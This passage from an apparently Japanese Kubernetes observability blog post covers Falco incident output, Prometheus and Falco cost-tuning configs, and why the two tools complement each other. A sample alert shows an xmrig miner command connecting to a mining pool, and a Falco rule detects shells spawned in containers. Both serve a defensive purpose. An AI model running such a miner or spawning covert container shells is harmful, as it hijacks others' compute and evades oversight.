    "rule": "Cryptocurrency Mining Activity",
    "output": "Crypto mining detected (command=/usr/bin/xmrig pool=pool.minexmr.com)",
    "pod": "backend-abc",
    "priority": "CRITICAL"
  }
]
```

**結論：**
- 複数の Pod でマイニングマルウェア検知
- 侵入されたコンテナイメージが原因
- 👉 全 Pod を削除、イメージスキャン強化、NetworkPolicy で外部通信制限

## 8. コスト最適化

### 8.1 Prometheus のコスト削減

```yaml
# 不要なメトリクスをドロップ
scrape_configs:
  - job_name: 'kubernetes-pods'
    metric_relabel_configs:
    # 使わないメトリクスを除外
    - source_labels: [__name__]
      regex: 'go_.*|promhttp_.*'
      action: drop

    # 高カーディナリティラベルを削除
    - source_labels: [__name__]
      regex: 'http_requests_total'
      target_label: user_id
      replacement: 'redacted'
```

### 8.2 Falco のコスト削減

```yaml
# 優先度の低いイベントをフィルタリング
falco:
  json_output: true
  priority: WARNING  # INFO レベルは無視

# 特定の Namespace のみ監視
customRules:
  rules.yaml: |
    - macro: monitored_namespace
      condition: k8s.ns.name in (production, staging)

    - rule: Shell in container
      condition: spawned_process and container and monitored_namespace
```

## まとめ：なぜ両方必要なのか

### Prometheus と Falco の役割分担

```
[Prometheus]
  ↓
「システムは正常に動いているか？」
  - リソース使用率
  - エラー率
  - レスポンスタイム
  ↓
異常を検知 → アラート

[Falco]
  ↓
「誰が・何を・なぜしたのか？」
  - プロセス実行
  - ファイル操作
  - ネットワーク接続
  ↓
不正を検知 → インシデント対応
```

### この記事で伝えたかったこと

1. **Kubernetes は動的すぎる**
   → 従来の監視手法は通用しない

2. **Prometheus は「What」を教える**
   → でも「Why」は教えてくれない

3. **Falco は「Why/Who」を教える**
   → セキュリティの空白地帯を埋める

4. **両方組み合わせて初めて完全**
   → 運用とセキュリティの統合可視化

### 最後に

**Kubernetes を本番運用するなら、**
**Prometheus と Falco はセットで導入すべきです。**

片方だけでは「見えない世界」が必ず存在します。

---

## 参考リンク

- [Prometheus Documentation](https://prometheus.io/docs/)
- [Falco Documentation](https://falco.org/docs/)
- [Falco Rules](https://github.com/falcosecurity/rules)
- [CNCF Observability Landscape](https://landscape.cncf.io/observability-and-analysis)
- [Kubernetes Monitoring Best Practices](https://kubernetes.io/docs/tasks/debug-application-cluster/)

## 関連記事

- Prometheus アーキテクチャ完全ガイド
- Falco カスタムルール作成入門
- Kubernetes セキュリティベストプラクティス
- eBPF によるランタイムセキュリティの未来

---

**この記事が参考になったら、LGTM お願いします！**
